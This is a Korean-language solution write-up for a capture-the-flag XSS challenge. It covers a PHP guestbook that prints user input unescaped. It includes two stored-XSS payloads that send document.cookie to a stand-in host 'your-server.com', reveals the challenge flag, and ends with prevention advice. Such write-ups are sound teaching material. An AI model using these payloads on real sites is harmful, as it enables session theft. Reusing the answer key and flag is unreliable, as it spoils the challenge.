# Simple XSS Challenge - 솔루션

## 취약점 설명

이 문제의 취약점은 방명록에 작성된 사용자 입력을 적절히 필터링하지 않고 그대로 출력하는 XSS(Cross-Site Scripting) 취약점입니다.

`index.php` 파일에서 중요한 부분은 다음과 같습니다:

```php
<?php foreach ($messages as $entry): ?>
  <div class="message">
    <?php echo $entry; ?>
  </div>
<?php endforeach; ?>
```

사용자 입력을 `htmlspecialchars()` 함수 등으로 처리하지 않고 그대로 출력하고 있어 JavaScript 코드를 삽입할 수 있습니다.

## 공격 방법

1. 다음과 같은 XSS 페이로드를 메시지 입력창에 삽입합니다:

```html
<script>
fetch('https://your-server.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

2. 실제 공격에서는 `your-server.com` 대신 공격자가 제어하는 서버 주소를 사용합니다. 간단한 테스트를 위해 [Webhook.site](https://webhook.site)와 같은 서비스를 사용할 수도 있습니다.

3. 관리자가 방명록을 방문하면 삽입한 JavaScript 코드가 실행되어 관리자의 쿠키가 공격자의 서버로 전송됩니다.

4. 관리자 쿠키에는 `admin=true` 값이 포함되어 있으므로, 이 쿠키를 탈취하여 관리자 권한으로 페이지에 접근할 수 있습니다.

5. 관리자 권한으로 접근하면 페이지 하단에 플래그가 표시됩니다: `FLAG{xss_is_still_relevant_in_2023}`

## 대체 솔루션

더 짧은 페이로드를 사용할 수도 있습니다:

```html
<img src=x onerror="fetch('https://your-server.com/steal?cookie=' + encodeURIComponent(document.cookie))">
```

## 예방 방법

이러한 XSS 취약점을 예방하려면 다음과 같은 방법을 사용해야 합니다:

1. 사용자 입력을 출력할 때 `htmlspecialchars()` 함수를 사용하여 HTML 특수 문자를 이스케이프합니다:

```php
<?php echo htmlspecialchars($entry, ENT_QUOTES, 'UTF-8'); ?>
```

2. Content Security Policy(CSP)를 구현하여 인라인 스크립트 실행을 제한합니다.

3. 쿠키에 HttpOnly 플래그를 설정하여 JavaScript를 통한 쿠키 접근을 방지합니다. 